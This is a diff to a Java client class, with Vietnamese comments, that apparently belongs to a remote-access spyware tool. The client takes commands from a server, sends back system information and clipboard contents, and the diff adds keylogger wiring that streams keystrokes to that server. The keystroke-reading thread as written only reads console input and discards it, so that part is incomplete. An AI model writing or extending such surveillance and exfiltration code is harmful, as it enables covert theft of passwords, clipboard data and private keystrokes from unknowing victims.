@@ -23,7 +23,26 @@ public class User {
             // Đối tượng để lấy thông tin hệ thống
             SystemInformation systeminfo = new SystemInformation();
             ClipboardReader clipboardReader = new ClipboardReader(); // Đối tượng để đọc clipboard
+             KeyLogger keyLogger = new KeyLogger(out); // Đối tượng KeyLogger
 
+             
+               // Thread để lắng nghe sự kiện từ bàn phím và gửi tới server
+            Thread keyListenerThread = new Thread(() -> {
+                try {
+                    BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
+                    String userInput;
+                    while ((userInput = stdIn.readLine()) != null) {
+                        // Có thể thêm logic xử lý thêm nếu cần
+                    }
+                } catch (IOException e) {
+                    System.err.println("Error reading from console: " + e.getMessage());
+                }
+            });
+
+            // Bắt đầu thread lắng nghe sự kiện từ bàn phím
+            keyListenerThread.start();
+            
+            
             String serverCommand;
             while ((serverCommand = in.readLine()) != null) {
                 System.out.println("Command from server: " + serverCommand);
@@ -37,12 +56,30 @@ public class User {
                     for (String line : infoLines) {
                         out.println("INFO:" + line);
                     }                 
-                } else if ("keylogger".equals(serverCommand)) {
-                    // Placeholder for keylogger functionality
+                
                 } else if ("clipboard".equals(serverCommand)) {
                     String clipboardData = clipboardReader.readClipboard();
                     out.println("CLIPBOARD:" + clipboardData);
+                } else if ("keylogger".equals(serverCommand)) {
+                    // Start keylogger functionality
+                    keyListenerThread.interrupt(); // Ngắt thread hiện tại (nếu cần)
+                    // Bắt đầu lắng nghe sự kiện từ bàn phím và gửi tới server
+                    keyListenerThread = new Thread(() -> {
+                        try {
+                            BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in));
+                            String userInput;
+                            while ((userInput = stdIn.readLine()) != null) {
+                                // Có thể thêm logic xử lý thêm nếu cần
+                            }
+                        } catch (IOException e) {
+                            System.err.println("Error reading from console: " + e.getMessage());
+                        }
+                    });
+                    keyListenerThread.start();
+                }else if ("exit".equals(serverCommand)) {
+                    keyLogger.stopKeylogger(); 
                 }
+
             }
         } catch (IOException e) {
             System.err.println("Error: " + e.getMessage());
